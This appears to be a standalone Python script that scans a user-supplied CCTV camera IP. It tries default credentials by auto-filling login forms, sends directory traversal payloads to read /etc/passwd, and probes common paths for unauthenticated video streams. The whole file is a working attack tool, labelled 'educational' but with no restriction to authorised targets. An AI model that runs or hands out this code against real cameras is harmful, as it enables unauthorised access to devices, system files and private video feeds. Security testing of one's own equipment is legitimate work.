import requests
import socket
import urllib.parse
from bs4 import BeautifulSoup

def check_default_credentials(ip, port=80):
    """Check for default credentials on CCTV cameras"""
    common_credentials = [
        ('admin', 'admin'),
        ('admin', '12345'),
        ('admin', '123456'),
        ('admin', 'password'),
        ('admin', ''),
        ('root', 'root'),
        ('root', '12345'),
        ('user', 'user')
    ]
    
    url = f"http://{ip}:{port}"
    session = requests.Session()
    
    for username, password in common_credentials:
        try:
            response = session.get(url, timeout=5)
            if any(x in response.text.lower() for x in ['login', 'password', 'username']):
                # Try to find login form
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                for form in forms:
                    auth_url = form.get('action', url)
                    if auth_url.startswith('/'):
                        auth_url = f"{url}{auth_url}"
                    
                    data = {}
                    for inp in form.find_all('input'):
                        name = inp.get('name')
                        value = inp.get('value', '')
                        if name:
                            if 'user' in name.lower():
                                data[name] = username
                            elif 'pass' in name.lower():
                                data[name] = password
                            else:
                                data[name] = value
                    
                    login_response = session.post(auth_url, data=data, timeout=5)
                    if 'logout' in login_response.text.lower() or 'welcome' in login_response.text.lower():
                        return f"Default credentials found: {username}/{password}"
        except:
            continue
    return "No default credentials found"

def check_vulnerabilities(ip, port=80):
    """Check for common CCTV vulnerabilities"""
    results = []
    
    # Check for open ports
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        if result == 0:
            results.append(f"Port {port} is open")
        else:
            return [f"Port {port} is closed - camera may not be accessible"]
        sock.close()
    except Exception as e:
        return [f"Connection error: {str(e)}"]
    
    # Check for default credentials
    creds_result = check_default_credentials(ip, port)
    results.append(creds_result)
    
    # Check for directory traversal (common in some CCTV models)
    traversal_payloads = [
        "../../../../../../../../../../etc/passwd",
        "../etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
    ]
    
    for payload in traversal_payloads:
        try:
            test_url = f"http://{ip}:{port}/{payload}"
            response = requests.get(test_url, timeout=5)
            if "root:" in response.text:
                results.append(f"Directory traversal vulnerability found with payload: {payload}")
                break
        except:
            continue
    
    # Check for unauthenticated video stream access
    common_stream_paths = [
        "video.mjpg", "stream.jpg", "mjpg/video.mjpg",
        "img/video.asf", "live.sdp", "cameras.htm",
        "snapshot.jpg", "tmpfs/auto.jpg"
    ]
    
    for path in common_stream_paths:
        try:
            test_url = f"http://{ip}:{port}/{path}"
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '')
                if any(x in content_type for x in ['image', 'video']):
                    results.append(f"Unauthenticated video stream found at: /{path}")
                    break
        except:
            continue
    
    return results

if __name__ == "__main__":
    print("CCTV Camera Vulnerability Scanner (Educational Purposes Only)")
    ip = input("Enter CCTV camera IP address: ")
    port = input("Enter port number (default 80): ") or "80"
    
    try:
        port = int(port)
        results = check_vulnerabilities(ip, port)
        print("\nScan Results:")
        for result in results:
            print(f"- {result}")
    except ValueError:
        print("Invalid port number")
    except Exception as e:
        print(f"Error during scan: {str(e)}")